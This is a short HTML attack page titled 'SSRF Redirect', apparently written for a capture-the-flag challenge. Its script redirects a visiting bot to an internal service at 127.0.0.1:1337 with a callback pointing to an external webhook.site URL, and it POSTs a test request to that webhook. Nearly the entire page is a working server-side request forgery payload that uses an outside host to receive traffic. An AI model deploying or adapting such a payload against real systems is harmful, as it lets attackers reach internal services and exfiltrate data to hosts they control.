<!DOCTYPE html>

    <title>SSRF Redirect</title>
</head>
<body>

        // Redirect bot to /tables with webhook callback
        window.location = 'http://127.0.0.1:1337/tables?callback=https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84';
        
        // Test webhook hit
        fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'test=RedirectAttempt'
        });

</body>
